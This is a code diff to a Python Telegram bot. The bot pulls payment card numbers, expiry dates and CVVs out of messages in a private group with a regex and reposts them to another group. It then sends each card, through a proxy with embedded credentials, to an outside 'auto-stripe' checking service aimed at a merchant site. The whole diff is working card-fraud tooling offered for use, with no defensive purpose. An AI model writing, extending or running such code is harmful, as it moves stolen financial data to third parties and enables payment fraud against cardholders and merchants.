@@ -18,17 +18,25 @@ PRIVATE_GROUP_ID = -1002682944548
 TARGET_GROUP_ID = -1002968335063
 ADMIN_ID = 8493360284
 
-API_URL = "https://autosh.arpitchk.shop/puto.php"
-SITE = "https://jasonwubeauty.com"
+SITE = "buildersdiscountwarehouse.com.au"
+API_BASE = "https://darkboy-auto-stripe-y6qk.onrender.com"
 
-# List of proxies
 PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]
-
 NUM_CONCURRENT = 5  # simultaneous API requests
 
 # ---------------- CARD REGEX ----------------
+# Matches cards with optional separators, CVV, expiry, and names
 CARD_REGEX = re.compile(
-    r"(\d{15,16})\s*[\|/:]?\s*(\d{2})\s*[\|/:]?\s*(\d{2,4})\s*[\|/:]?\s*(\d{3,4})"
+    r"""
+    (?P<cc>\d{13,16})            # Card number
+    (?:[\s|:/\\]+)?               # Optional separator
+    (?P<exp_month>\d{2})?         # Optional month
+    (?:[\s|:/\\]+)?               # Optional separator
+    (?P<exp_year>\d{2,4})?        # Optional year
+    (?:[\s|:/\\]+)?               # Optional separator
+    (?P<cvv>\d{3,4})?             # Optional CVV
+    """,
+    re.VERBOSE | re.MULTILINE
 )
 
 # ---------------- CLIENTS ----------------
@@ -41,35 +49,60 @@ dropping_enabled = False
 semaphore = asyncio.Semaphore(NUM_CONCURRENT)
 
 # ---------------- FUNCTIONS ----------------
-async def check_card(card: str):
-    """Process card with API, respecting concurrency"""
+async def check_card_and_update(msg_obj, card: str):
+    """Check card via API and update Telegram message"""
     global session
     async with semaphore:
         proxy = random.choice(PROXIES)
-        params = {"site": SITE, "cc": card, "proxy": proxy}
+        url = f"{API_BASE}/gateway=autostripe/key=darkboy/site={SITE}/cc={card}"
 
-        for attempt in range(3):
-            try:
-                async with session.get(API_URL, params=params, timeout=15) as resp:
-                    data = await resp.json()
-                    break
-            except Exception as e:
-                data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
-                await asyncio.sleep(1)
+        try:
+            async with session.get(url, timeout=15) as resp:
+                data = await resp.json()
+        except Exception as e:
+            data = {"response": f"API Error: {e}", "status": "Error"}
 
-        cc = escape_markdown(str(data.get("cc")), version=2)
-        price = escape_markdown(str(data.get("Price")), version=2)
-        response = escape_markdown(str(data.get("Response")), version=2)
-        msg = f"✨ *Card Check Result* ✨\n\n💳 CC: `{cc}`\n💰 Price: {price}\n📊 Response: {response}"
+        response = escape_markdown(str(data.get("response")), version=2)
+        status = escape_markdown(str(data.get("status")), version=2)
 
-        if dropping_enabled:
-            try:
-                await bot_client.send_message(chat_id=TARGET_GROUP_ID, text=msg, parse_mode="MarkdownV2")
-                print(f"[✓] Sent: {card} -> {data.get('Response')}")
-            except Exception as e:
-                print(f"❌ Failed to send: {card} -> {e}")
-        else:
-            print(f"[i] Dropping disabled: {card} -> {data.get('Response')}")
+        new_text = msg_obj.text + f"\n\n📊 Checked Result:\nStatus: {status}\nResponse: {response}"
+        try:
+            await msg_obj.edit_text(new_text, parse_mode="MarkdownV2")
+            print(f"[✓] Updated: {card} -> {status}")
+        except Exception as e:
+            print(f"[❌] Failed to update: {card} -> {e}")
+
+async def drop_card(card: str):
+    """Send card immediately, then process API"""
+    global dropping_enabled
+    if not dropping_enabled:
+        print(f"[i] Dropping disabled: {card}")
+        return
+
+    try:
+        msg_obj = await bot_client.send_message(
+            chat_id=TARGET_GROUP_ID,
+            text=f"💳 CC Detected: `{escape_markdown(card, version=2)}`",
+            parse_mode="MarkdownV2"
+        )
+        print(f"[+] Dropped: {card}")
+        asyncio.create_task(check_card_and_update(msg_obj, card))
+    except Exception as e:
+        print(f"[❌] Failed to drop: {card} -> {e}")
+
+def extract_cards(text: str):
+    """Extract all possible cards from messy text"""
+    matches = CARD_REGEX.finditer(text)
+    cards = []
+    for m in matches:
+        parts = [m.group("cc")]
+        if m.group("exp_month") and m.group("exp_year"):
+            parts.append(m.group("exp_month"))
+            parts.append(m.group("exp_year"))
+        if m.group("cvv"):
+            parts.append(m.group("cvv"))
+        cards.append("|".join(parts))
+    return cards
 
 # ---------------- TELETHON EVENT ----------------
 @user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
@@ -77,12 +110,11 @@ async def card_listener(event):
     text = event.message.message
     if not text:
         return
-    matches = CARD_REGEX.findall(text)
-    if matches:
-        for match in matches:
-            card_str = "|".join(match)
-            asyncio.create_task(check_card(card_str))
-            print(f"[+] Card detected and processing immediately: {card_str}")
+    cards = extract_cards(text)
+    if cards:
+        for card_str in cards:
+            asyncio.create_task(drop_card(card_str))
+            print(f"[+] Card detected and processing: {card_str}")
 
 # ---------------- TELEGRAM COMMANDS ----------------
 async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
